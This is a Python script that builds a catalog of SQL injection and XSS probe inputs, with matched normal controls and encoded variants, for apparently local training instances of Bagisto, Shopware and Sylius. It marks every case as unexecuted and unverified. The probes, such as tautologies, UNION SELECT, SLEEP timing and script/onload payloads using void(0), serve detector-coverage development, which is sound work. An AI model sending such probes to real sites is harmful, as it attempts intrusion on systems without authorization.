"""Coverage candidates, not executed attacks. No numeric padding or false success claims."""
import collections
import csv
import io
import json
from pathlib import Path
from core import sha

ASSIGNMENT = ('bagisto', 'shopware', 'sylius')
SQL_SOURCE = 'https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection'
XSS_SOURCE = 'https://community.owasp.org/Types_of_Cross-Site_Scripting'
CONTEXT_SOURCE = 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
TAXONOMY = [
 ('sqli.condition','SQLi機制','改變查詢條件'), ('sqli.union','SQLi機制','UNION 型'),
 ('sqli.error','SQLi機制','錯誤回顯型'), ('sqli.boolean_blind','SQLi觀測','布林盲注'),
 ('sqli.time_blind','SQLi觀測','時間盲注'), ('sqli.stacked','SQLi機制','堆疊查詢'),
 ('sqli.oob','SQLi通道','帶外通道'), ('sqli.second_order','SQLi生命週期','二次注入'),
 ('xss.reflected','XSS生命週期','反射型候選'), ('xss.stored','XSS生命週期','儲存型候選'),
 ('xss.dom','XSS資料流','DOM 型候選'), ('xss.html','XSS情境','HTML 內容'),
 ('xss.attribute','XSS情境','HTML 屬性'), ('xss.event','XSS情境','事件處理屬性'),
 ('xss.javascript','XSS情境','JavaScript 字串／區塊'), ('xss.url','XSS情境','URL 屬性／協定'),
 ('xss.dom_sink','XSS情境','前端 DOM 操作'), ('xss.css','XSS情境','CSS／style 邊界'),
 ('variation.case','變體','大小寫'), ('variation.whitespace','變體','空白與分隔'),
 ('variation.url_encoding','變體','URL 編碼'), ('variation.html_entities','變體','HTML 實體'),
 ('variation.unicode','變體','Unicode 表示'), ('variation.decode_layers','變體','多層解碼'),
]


def base_cases():
    result = []
    def add(key,label,value,family,tags,context,target='search',auto=True,**extra):
        row = {'base_case_id':key,'proposed_label':label,'value':value,'family_id':family,
            'coverage_tags':tags.split(), 'input_context':context,'target':target,'can_collect_http':auto,
            'http_visible':True,'lifecycle':None,'workflow_id':None,'workflow_stage':None,
            'prerequisites':[], 'expected_observation':'正常對照與實際 HTTP 結果；不宣稱攻擊已成功',
            'variant_of':None,'variant_kind':'base','control_value':'Alice' if target=='address' else 'cotton',
            'review_status':'pending_human_review','executed':False,'success_verified':False,'training_eligible':False,
            'normal_kind':'ordinary_or_special_text' if label=='normal' else None,
            'source':SQL_SOURCE if label=='sqli' else CONTEXT_SOURCE}
        row.update(extra);result.append(row)
    add('sql-condition-string','sqli',"' OR 'a'='a' -- ",'sql.boolean','sqli.condition','SQL 單引號字串')
    add('sql-condition-numeric','sqli','1 OR 1=1','sql.boolean','sqli.condition','SQL 數值',target='numeric_field',auto=False,
        prerequisites=['先選定已驗證的數值參數；不能將姓名欄當成數值 SQL 語境'])
    add('sql-condition-parenthesis','sqli',"') OR ('a'='a') -- ",'sql.boolean','sqli.condition','SQL 括號包覆字串')
    add('sql-condition-case','sqli',"' oR 'a'='a' -- ",'sql.boolean','sqli.condition variation.case','SQL 字串大小寫變體',
        variant_of='sql-condition-string',variant_kind='case')
    add('sql-condition-whitespace','sqli',"'/**/OR/**/'a'='a' -- ",'sql.boolean','sqli.condition variation.whitespace','SQL 字串空白變體',
        variant_of='sql-condition-string',variant_kind='whitespace')
    add('sql-union-null','sqli',"' UNION SELECT NULL -- ",'sql.union','sqli.union','查詢結果拼接／NULL')
    add('sql-union-constant','sqli',"' UNION SELECT 'local' -- ",'sql.union','sqli.union','查詢結果拼接／常數')
    add('sql-error-json','sqli',"' AND JSON_EXTRACT('not-json','$') IS NULL -- ",'sql.error','sqli.error','MySQL／MariaDB JSON 解析',
        prerequisites=['先記錄 DBMS 版本；需追溯資料庫錯誤，不把任意 500 視為成功'])
    add('sql-error-scalar','sqli',"' AND (SELECT 1 UNION ALL SELECT 2)=1 -- ",'sql.error','sqli.error','scalar subquery 多列錯誤探查')
    for stage,expr in [('true',"LENGTH('local')=5"),('false',"LENGTH('local')=4")]:
        add('sql-blind-'+stage,'sqli',"' AND "+expr+' -- ','sql.boolean','sqli.boolean_blind','真假條件配對',auto=True,
            workflow_id='sql-blind-pair',workflow_stage=stage,prerequisites=['採集器記錄成對觀測；正式結論另需重複比較及排除快取與登入差異'],
            expected_observation='正常基線、真／假條件的多次比較；單筆請求不能證明布林盲注成功')
    for stage,expr in [('zero','SLEEP(0)'),('bounded-delay','SLEEP(0.05)')]:
        add('sql-time-'+stage,'sqli',"' AND "+expr+'=0 -- ','sql.time','sqli.time_blind','MySQL／MariaDB 有界計時',auto=True,
            workflow_id='sql-time-pair',workflow_stage=stage,prerequisites=['最多 50ms 常數探查；採集器記錄配對時間，正式結論另需負載控制與重複計時'],
            expected_observation='零延遲與 50ms 常數探查配對；不能以單次慢回應判斷')
    add('sql-stacked-constant','sqli',"'; SELECT 1; -- ",'sql.stacked','sqli.stacked','SQL 語句邊界／僅常數 SELECT')
    add('sql-oob-workflow','sqli',None,'sql.oob','sqli.oob','依 DBMS 的帶外通道',target='local_receiver',auto=False,
        workflow_id='sql-oob',workflow_stage='needs_receiver',prerequisites=['未建立獨立本機接收器與 DBMS 能力，保留空 payload，不編造外部回呼'],
        expected_observation='本機接收器紀錄需與 request ID 對帳；目前沒有實測資料')
    add('sql-second-order-store','sqli',"' OR 'local' LIKE 'loc%' -- ",'sql.boolean','sqli.second_order','先保存、後續 SQL 使用',target='address',auto=False,
        workflow_id='sql-second-order',workflow_stage='store_then_trace',prerequisites=['須證明選定 API 的真實下游 SQL 使用點；不能自行新增漏洞'],
        expected_observation='保存、下游取用、SQL 使用點三者對帳；讀回地址不是二次注入成功')
    add('sql-order-expression','sqli','CASE WHEN 1=1 THEN name ELSE id END','sql.structure','sqli.condition','ORDER BY 結構',target='sort_field',auto=False,
        prerequisites=['先確認排序欄位語意與允許值；不假設存在 name/id 欄位或接受運算式'])
    add('sql-like-context','sqli',"%' OR 'a'='a' -- ",'sql.boolean','sqli.condition','LIKE 模糊搜尋字串')
    add('sql-filter-tree','sqli',"' OR 'a'='a' -- ",'sql.boolean','sqli.condition','JSON 巢狀篩選器值',target='filter_value',auto=False,
        prerequisites=['先核對實例 filter 結構與欄位，不能假設結構化 filter 直拼 SQL'])
    add('sql-condition-json-body','sqli',"' OR 'a'='a' -- ",'sql.boolean','sqli.condition','JSON body 字串值',target='address',
        prerequisites=['只作 HTTP body 注入嘗試；不能據姓名保存推定存在 SQL 使用點'])
    add('sql-extra-url-decode','sqli','%27%20OR%20%27a%27%3D%27a%27%20--%20','sql.boolean','sqli.condition variation.url_encoding variation.decode_layers','額外 URL 解碼後的 SQL 字串',auto=False,
        variant_of='sql-condition-string',variant_kind='url_encoding',prerequisites=['需證明額外應用解碼；正常傳輸百分比編碼不算新家族'])
    add('sql-extra-unicode-decode','sqli',r'\u0027 OR \u0027a\u0027=\u0027a\u0027 -- ','sql.boolean','sqli.condition variation.unicode variation.decode_layers','字串內 Unicode 表示再解析',auto=False,
        variant_of='sql-condition-string',variant_kind='unicode_encoding',prerequisites=['必須證明額外解碼鏈，不能把普通反斜線文字直接當已生效 SQL'])

    add('xss-html-reflected','xss','<script>void(0)</script>','xss.script','xss.reflected xss.html','HTML 內容',lifecycle='reflected_candidate',
        prerequisites=['前端輸出點未驗證；HTTP 只代表嘗試，不是已證實反射 XSS'])
    add('xss-html-stored','xss','<script>void(0)</script>','xss.script','xss.stored xss.html','保存後顯示文字',target='address',lifecycle='stored_candidate',
        prerequisites=['須查回保存內容，另需真實商店畫面與瀏覽器驗證；JSON 讀回不等於執行'])
    add('xss-event-image','xss','<img src="data:image/png;base64,AA==" onerror="void(0)">','xss.event','xss.reflected xss.html xss.event','HTML 事件／無效內嵌圖片',lifecycle='reflected_candidate')
    add('xss-event-svg','xss','<svg onload="void(0)"></svg>','xss.event','xss.stored xss.html xss.event','SVG 事件',target='address',lifecycle='stored_candidate')
    for key,value,context in [
        ('double','" autofocus onfocus="void(0)" data-x="','雙引號 HTML 屬性'),
        ('single',"' autofocus onfocus='void(0)' data-x='",'單引號 HTML 屬性'),
        ('unquoted','x onmouseover=void(0)','無引號 HTML 屬性')]:
        add('xss-attribute-'+key,'xss',value,'xss.event','xss.attribute xss.event',context,auto=False,
            prerequisites=['先確認相符的真實屬性輸出位置；不能將任何文字欄都當成此語境'])
    for key,value,context in [
        ('string-double','";void(0);//','雙引號 JavaScript 字串'),
        ('string-single',"';void(0);//",'單引號 JavaScript 字串')]:
        add('xss-js-'+key,'xss',value,'xss.js-string','xss.javascript',context,auto=False,
            prerequisites=['先證明輸入進入 JavaScript 原始碼字串，而非安全資料值'])
    add('xss-js-block','xss','</script><script>void(0)</script>','xss.script','xss.javascript xss.html','script 區塊邊界',auto=False,
        prerequisites=['真實 script 輸出點及瀏覽器解析驗證'])
    add('xss-js-template','xss','${void(0)}','xss.js-template','xss.javascript','JavaScript template literal',auto=False,
        prerequisites=['先確認進入 template literal 原始碼，而非一般字串資料'])
    add('xss-url-attribute','xss','javascript:void(0)','xss.url','xss.url','URL 屬性／協定',target='url_field',auto=False,
        prerequisites=['目前尚無已核實 URL 欄位與真實前端使用點'])
    add('xss-url-html','xss','<a href="javascript:void(0)">View item</a>','xss.url','xss.reflected xss.html xss.url','HTML 連結內 URL',lifecycle='reflected_candidate')
    for key,target,visible,context in [('query','search',True,'query → DOM sink'),('fragment','browser_fragment',False,'URL fragment → DOM sink'),
                                      ('localstorage','browser_storage',False,'localStorage → DOM sink')]:
        add('xss-dom-'+key,'xss','<svg onload="void(0)"></svg>','xss.event','xss.dom xss.dom_sink'+(' xss.stored' if key=='localstorage' else ''),
            context,target=target,auto=False,http_visible=visible,lifecycle='dom_candidate',
            prerequisites=['需要真實前端來源到 sink 追蹤；沒有 HTTP 載荷時排除 request-only 訓練集，不新增脆弱頁面'])
    add('xss-style-boundary','xss','</style><svg onload="void(0)"></svg>','xss.event','xss.css xss.html','style 區塊邊界',auto=False,
        prerequisites=['確認真實 style 輸出點；普通 CSS 注入不直接等同 XSS'])
    add('xss-script-case','xss','<ScRiPt>void(0)</ScRiPt>','xss.script','xss.html variation.case','HTML 大小寫變體',
        variant_of='xss-html-reflected',variant_kind='case')
    add('xss-event-whitespace','xss','<svg\nonload="void(0)"></svg>','xss.event','xss.html xss.event variation.whitespace','HTML 空白變體',
        variant_of='xss-event-svg',variant_kind='whitespace')
    for key,value,tag in [('url','%3Cscript%3Evoid(0)%3C%2Fscript%3E','variation.url_encoding'),
                          ('entity','&lt;script&gt;void(0)&lt;/script&gt;','variation.html_entities'),
                          ('unicode',r'\u003cscript\u003evoid(0)\u003c/script\u003e','variation.unicode')]:
        add('xss-extra-'+key+'-decode','xss',value,'xss.script',tag+' variation.decode_layers','額外解碼後重插入 HTML',auto=False,
            variant_of='xss-html-reflected',variant_kind=key+'_encoding',
            prerequisites=['必須證明額外解碼鏈；URL 傳輸編碼或 JSON 語法解碼不等於再次解碼字串，否則可能是安全文字'])
    for key,value,target,tags in [('apostrophe',"O'Connor",'address',''),('unicode','陳美玲','address','variation.unicode'),
        ('hyphen','Jean-Luc','address',''),('ampersand','A&B cotton','search',''),('percent','100% cotton','search',''),
        ('sql-lesson','SQL 課程：SELECT name FROM products','search',''),('script-lesson','JavaScript script 教學','search',''),
        ('entities','&lt;b&gt;棉質&lt;/b&gt;','search','variation.html_entities'),('url','https://example.test/catalog','search',''),
        ('json-escape',r'說明文字 \u003c 是 Unicode 轉義','search','variation.unicode'),('parentheses','(small) blue shirt','search',''),
        ('empty-required','','address','')]:
        add('normal-'+key,'normal',value,None,tags,'合法文字或已定義非攻擊錯誤',target=target)
        if key=='empty-required':result[-1]['normal_kind']='missing_required_value'
    return result


def cases(platform):
    if platform not in ASSIGNMENT: raise ValueError('僅允許三個本機訓練平台')
    result=[]
    for index,base in enumerate(base_cases()):
        item={**base,'case_id':sha([2,platform,base['base_case_id']])[:24],'pair_group':f'{platform}-pair-{index:03d}'}
        if base['proposed_label']!='normal' and base['can_collect_http']:
            result.append({**item,'case_id':sha([2,platform,base['base_case_id'],'control'])[:24],
                'base_case_id':base['base_case_id']+'-control','proposed_label':'normal','value':base['control_value'],
                'family_id':None,'coverage_tags':[],'normal_kind':'matched_positive_control','role':'control'})
        result.append({**item,'role':'case'})
    return result


def build_catalog():
    bases=base_cases()
    return {'version':2,'executed':False,'human_reviewed':False,'training_ready':False,
        'counting_rule':'主表每個基礎情境一列；平台複用、工作階段及變體不算獨立家族。',
        'evaluation_role':'coverage_development_only：跨平台共用家族用來核對情境；不得當作未知家族跨平台測試。正式試驗另選家族子集。',
        'base_case_count':len(bases),'base_proposed_labels':dict(collections.Counter(b['proposed_label'] for b in bases)),
        'http_collectable_base_cases':sum(b['can_collect_http'] for b in bases),
        'attack_family_count':len({b['family_id'] for b in bases if b['family_id']}),
        'base_cases':bases,'platforms':{p:cases(p) for p in ASSIGNMENT},
        'taxonomy':[{'id':i,'dimension':d,'name':n} for i,d,n in TAXONOMY]}


def export_catalog_csv(catalog,target):
    headers=['情境ID','候選類別','面向','輸入情境','生命週期','目標','輸入內容JSON','家族','變體種類','原始情境',
        '可進本機HTTP採集','HTTP可見','工作流程','階段','前置條件','應觀察內容','適用平台','是否實際送出','成功已證實','完整情境JSON']
    rows=[]
    for b in catalog['base_cases']:
        rows.append(dict(zip(headers,[b['base_case_id'],b['proposed_label'],'; '.join(b['coverage_tags']),b['input_context'],b['lifecycle'] or '',
            b['target'],json.dumps(b['value'],ensure_ascii=False),b['family_id'] or '',b['variant_kind'],b['variant_of'] or '',
            str(b['can_collect_http']).lower(),str(b['http_visible']).lower(),b['workflow_id'] or '',b['workflow_stage'] or '',
            '；'.join(b['prerequisites']),b['expected_observation'],'; '.join(ASSIGNMENT),'false','false',json.dumps(b,ensure_ascii=False,sort_keys=True)])))
    buffer=io.StringIO(newline='');w=csv.DictWriter(buffer,fieldnames=headers,quoting=csv.QUOTE_ALL);w.writeheader();w.writerows(rows)
    restored=list(csv.DictReader(io.StringIO(buffer.getvalue())))
    assert [json.loads(r['完整情境JSON']) for r in restored]==catalog['base_cases']
    target.write_text(buffer.getvalue(),encoding='utf-8-sig',newline='')
    return len(rows)


def main():
    here=Path(__file__).resolve().parent;catalog=build_catalog();present=here/'scenario-catalog.json'
    if present.exists() and json.loads(present.read_text(encoding='utf-8')).get('version')==1:
        saved=here/'history/catalog-v1/scenario-catalog.json'
        if not saved.is_file() or sha(saved.read_bytes())!=sha(present.read_bytes()):raise RuntimeError('請先歸檔舊版與人工修改')
        old_csv=here/'scenario-catalog.csv'; saved_csv=here/'history/catalog-v1/scenario-catalog.csv'
        if old_csv.exists() and (not saved_csv.exists() or sha(old_csv.read_bytes())!=sha(saved_csv.read_bytes())):
            raise RuntimeError('舊 CSV 尚有未歸檔修改，拒絕覆寫')
    elif (here/'reports/catalog-v2.json').exists() and (here/'scenario-catalog.csv').exists():
        previous=json.loads((here/'reports/catalog-v2.json').read_text(encoding='utf-8'))
        if sha((here/'scenario-catalog.csv').read_bytes())!=previous['csv_sha256']:
            raise RuntimeError('CSV 有人工修改，請先歸檔後再重建')
    present.write_text(json.dumps(catalog,ensure_ascii=False,indent=2)+'\n',encoding='utf-8')
    count=export_catalog_csv(catalog,here/'scenario-catalog.csv');matrix=[]
    for t in catalog['taxonomy']:
        related=[b for b in catalog['base_cases'] if t['id'] in b['coverage_tags']]
        matrix.append({'面向ID':t['id'],'分類維度':t['dimension'],'面向名稱':t['name'],'基礎情境數':len(related),
            '可HTTP採集數':sum(b['can_collect_http'] for b in related),'需額外流程數':sum(not b['can_collect_http'] for b in related),
            '已實測數':0,'情境ID':'; '.join(b['base_case_id'] for b in related)})
    with (here/'coverage-matrix.csv').open('w',encoding='utf-8-sig',newline='') as f:
        w=csv.DictWriter(f,fieldnames=list(matrix[0]),quoting=csv.QUOTE_ALL);w.writeheader();w.writerows(matrix)
    report={k:catalog[k] for k in ('version','base_case_count','base_proposed_labels','http_collectable_base_cases','attack_family_count','training_ready')}
    report.update({'coverage_dimensions':len(matrix),'missing_dimensions':[r['面向ID'] for r in matrix if not r['基礎情境數']],
        'csv_rows':count,'csv_roundtrip_equal':True,'actual_http_attack_samples':0,
        'json_sha256':sha(present.read_bytes()),'csv_sha256':sha((here/'scenario-catalog.csv').read_bytes())})
    (here/'reports/catalog-v2.json').write_text(json.dumps(report,ensure_ascii=False,indent=2)+'\n',encoding='utf-8')
    print(json.dumps(report,ensure_ascii=False))


if __name__=='__main__':main()
